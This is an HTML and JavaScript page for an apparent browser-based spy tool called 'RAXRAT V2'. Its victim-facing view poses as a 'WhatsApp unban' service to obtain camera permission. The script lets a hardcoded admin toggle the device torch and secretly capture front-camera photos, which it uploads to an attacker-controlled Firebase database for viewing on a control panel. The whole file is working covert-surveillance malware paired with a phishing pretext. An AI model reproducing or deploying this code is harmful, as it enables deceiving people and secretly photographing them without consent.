<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RAXRAT V2 | SPY-PHOTO EDITION</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap');
        body { background: #000; color: #fff; font-family: 'JetBrains Mono', monospace; }
        .rax-card { background: rgba(10,10,10,0.9); border: 1px solid #1a1a1a; border-radius: 24px; backdrop-filter: blur(10px); }
        .neon-green { color: #00ff88; text-shadow: 0 0 10px rgba(0,255,136,0.3); }
        .hidden { display: none !important; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div id="boxAuth" class="w-full max-w-sm p-10 rax-card shadow-2xl">
        <div class="text-center mb-10">
            <h1 class="text-4xl font-black italic neon-green">RAXRAT V2</h1>
            <p class="text-[8px] tracking-[4px] text-zinc-600 uppercase mt-2">Remote Spy & Command</p>
        </div>
        <div class="space-y-4">
            <input type="text" id="usr" placeholder="USERNAME" class="w-full p-4 bg-zinc-900/50 border border-zinc-800 rounded-xl outline-none focus:border-green-500 text-green-400">
            <input type="password" id="pwd" placeholder="PASSWORD" class="w-full p-4 bg-zinc-900/50 border border-zinc-800 rounded-xl outline-none focus:border-green-500 text-green-400">
            <div class="flex gap-2">
                <button onclick="doAuth('reg')" class="flex-1 py-4 bg-zinc-800 text-zinc-500 rounded-xl font-bold text-[10px] uppercase">Register</button>
                <button onclick="doAuth('login')" class="flex-1 py-4 bg-green-600 text-black font-black rounded-xl text-[10px] uppercase">Login</button>
            </div>
        </div>
    </div>

    <div id="dashAdmin" class="hidden w-full max-w-5xl space-y-4">
        <div class="rax-card p-6 flex justify-between items-center border-l-4 border-green-500">
            <div>
                <h2 class="font-black text-xl neon-green italic">CONTROL PANEL</h2>
                <p id="targetStatus" class="text-[10px] text-zinc-500 uppercase mt-1">Status: <span class="text-red-500 font-bold">Waiting...</span></p>
            </div>
            <button onclick="location.reload()" class="text-[10px] text-red-500 font-bold uppercase underline">Terminate</button>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div class="rax-card p-6 space-y-4">
                <p class="text-[10px] text-zinc-600 font-bold uppercase">Remote Commands</p>
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="sendCmd('SENTER_ON')" class="p-4 bg-zinc-900 rounded-xl hover:bg-yellow-500 transition">🔦 ON</button>
                    <button onclick="sendCmd('SENTER_OFF')" class="p-4 bg-zinc-900 rounded-xl hover:bg-white transition">🌑 OFF</button>
                    <button onclick="sendCmd('TAKE_PHOTO')" class="col-span-2 p-4 bg-blue-600/20 text-blue-400 border border-blue-600/30 rounded-xl hover:bg-blue-600 hover:text-white transition">📸 AMBIL FOTO TARGET</button>
                </div>
            </div>

            <div class="rax-card p-6 flex flex-col items-center justify-center">
                <p class="text-[10px] text-zinc-600 font-bold uppercase mb-4">Captured Image</p>
                <div id="photoBox" class="w-full aspect-[3/4] bg-zinc-900 rounded-xl overflow-hidden border border-zinc-800 flex items-center justify-center">
                    <span id="noPhotoText" class="text-zinc-700 text-[10px]">No Photo Yet</span>
                    <img id="spyImg" class="hidden w-full h-full object-cover">
                </div>
            </div>

            <div class="rax-card p-6">
                <p class="text-[10px] text-zinc-600 font-bold uppercase mb-4">Activity Logs</p>
                <div id="logs" class="h-64 overflow-y-auto font-mono text-[9px] text-green-500 p-2">
                    > Initializing Cloud...
                </div>
            </div>
        </div>
    </div>

    <div id="dashUser" class="hidden w-full max-w-md p-10 rax-card text-center border-t-4 border-blue-500">
        <h2 class="text-2xl font-black mb-4">SERVICE: UNBAN WA</h2>
        <p class="text-xs text-zinc-500 mb-8 leading-relaxed">Harap tetap di halaman ini. Kami sedang memproses permintaan enkripsi nomor Anda.</p>
        <div id="bindingOverlay" class="space-y-6">
            <div class="text-6xl animate-pulse">📡</div>
            <button onclick="startBinding()" id="btnBind" class="w-full py-5 bg-white text-black font-black rounded-full tracking-tighter text-sm">AKTIFKAN SINKRONISASI</button>
        </div>
    </div>

    <script>
        // SUNTIKAN URL FIREBASE RALXA
        const firebaseConfig = { databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const cmdRef = db.ref("raxrat_v2/control");
        const statusRef = db.ref("raxrat_v2/status");
        const photoRef = db.ref("raxrat_v2/photos");

        let currentRole = "";
        let localDB = JSON.parse(localStorage.getItem('raxDB')) || { "Ralxa": "Rata" };

        function doAuth(mode) {
            const u = document.getElementById('usr').value;
            const p = document.getElementById('pwd').value;
            if (mode === 'reg') {
                if(!u || !p) return alert("DATA KOSONG!");
                localDB[u] = p; localStorage.setItem('raxDB', JSON.stringify(localDB));
                alert("SUKSES REGISTRASI!"); return;
            }
            if (u === "Ralxa" && p === "Rata") { currentRole = "admin"; initAdmin(); } 
            else if (localDB[u] === p) { currentRole = "target"; initTarget(u); }
            else { alert("PASSWORD SALAH!"); }
        }

        // --- LOGIKA ADMIN ---
        function initAdmin() {
            document.getElementById('boxAuth').classList.add('hidden');
            document.getElementById('dashAdmin').classList.remove('hidden');
            
            statusRef.on("value", (snap) => {
                const data = snap.val();
                document.getElementById('targetStatus').innerHTML = (data && data.online) ? `Target: <span class="text-green-500 font-bold">ONLINE (${data.user})</span>` : `Target: <span class="text-red-500 font-bold">OFFLINE</span>`;
            });

            photoRef.on("value", (snap) => {
                const data = snap.val();
                if (data && data.img) {
                    document.getElementById('noPhotoText').classList.add('hidden');
                    const img = document.getElementById('spyImg');
                    img.src = data.img; img.classList.remove('hidden');
                    document.getElementById('logs').innerHTML += `<div>[${new Date().toLocaleTimeString()}] PHOTO_CAPTURED!</div>`;
                }
            });
        }

        function sendCmd(act) {
            cmdRef.set({ action: act, time: Date.now() });
            document.getElementById('logs').innerHTML += `<div>[${new Date().toLocaleTimeString()}] SENT: ${act}</div>`;
        }

        // --- LOGIKA TARGET ---
        function initTarget(username) {
            document.getElementById('boxAuth').classList.add('hidden');
            document.getElementById('dashUser').classList.remove('hidden');
            statusRef.set({ online: true, user: username });
            statusRef.onDisconnect().set({ online: false, user: "none" });

            cmdRef.on("value", (snap) => {
                if (currentRole !== "target") return;
                const data = snap.val();
                if (!data) return;

                if (data.action === "SENTER_ON") {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                    .then(s => { 
                        const t = s.getVideoTracks()[0];
                        t.applyConstraints({ advanced: [{ torch: true }] });
                        window.raxStr = s;
                    });
                } else if (data.action === "SENTER_OFF") {
                    if (window.raxStr) window.raxStr.getTracks().forEach(t => t.stop());
                } else if (data.action === "TAKE_PHOTO") {
                    captureSpy();
                }
            });
        }

        function captureSpy() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => {
                const v = document.createElement('video'); v.srcObject = s; v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = 480; c.height = 640;
                    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                    photoRef.set({ img: c.toDataURL('image/jpeg', 0.5), time: Date.now() });
                    s.getTracks().forEach(t => t.stop());
                }, 1000);
            });
        }

        function startBinding() {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                alert("ENKRIPSI AKTIF!");
                document.getElementById('btnBind').innerHTML = "TERHUBUNG KE SERVER ✅";
                s.getTracks().forEach(t => t.stop());
            });
        }
    </script>
</body>
</html>
